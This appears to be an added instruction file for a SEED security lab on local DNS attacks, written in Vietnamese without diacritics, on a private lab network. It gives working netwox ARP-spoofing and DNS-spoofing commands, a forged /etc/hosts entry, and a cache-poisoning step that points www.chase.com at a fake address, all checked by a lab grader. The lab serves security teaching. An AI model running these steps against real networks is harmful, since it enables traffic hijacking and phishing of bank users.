@@ -1,0 +1,37 @@
+BAI LAB: LOCAL DNS ATTACK (SEED) - dns-hijack-medium
+============================================================
+
+Topology:
+  - user        (192.168.0.100): may nan nhan, DNS server = 192.168.0.10
+  - apollo-dns  (192.168.0.10):  DNS server (BIND9), zone example.com,
+                                forwards cac domain khac toi gateway.
+  - gateway     (192.168.0.1):   dnsmasq upstream DNS.
+  - attacker    (192.168.0.200): may tan cong (netwox + tcpdump).
+
+Cac task phaming theo SEED manual (docs/local-dns.pdf):
+
+TASK 1 (May nan nhan bi compromised): sua /etc/hosts tren user
+  echo "1.2.3.4 www.example.com" | sudo tee -a /etc/hosts
+
+TASK 2 (Spoof truc tiep response toi user):
+  - Chay arp-spoof va va mitm... Neu khong co arpspoof: su dung netwox 80
+    (netwox 80 -e <attacker_mac> -i 192.168.0.10 -E <user_mac> -I 192.168.0.100)
+  - Chay: netwox 105 -h www.example.com -H 1.2.3.4 -a ns.example.com -A 192.168.0.10
+  - Cap nhat cho user: dig www.example.com tren user -> phai nhan 1.2.3.4
+  - Luu evidence: sudo tcpdump -i eth0 -n -w /home/ubuntu/spoof.pcapng udp port 53
+
+TASK 3 (DNS cache poisoning Apollo):
+  - Flush cache: tren apollo-dns, chay: sudo rndc flush
+  - ARP poison giua Apollo va gateway bang netwox 80
+    ( netwox 80 -e <attacker_mac> -i 192.168.0.1 -E <apollo_mac> -I 192.168.0.10 )
+  - Chay spoof: netwox 105 -h www.chase.com -H 10.99.0.99 -a www.chase.com -A 10.99.0.99
+  - Tren user, dig www.chase.com se tro ve 10.99.0.99
+
+TASK 4: Ping/Dig tu user phai tra ve IP gia mao.
+
+Kiem tra:
+    checkwork
+De xem checkwork. Cac checkwork la moi CSV kiem tra theo 4 task.
+
+Ket thuc:
+    stoplab dns-hijack-medium
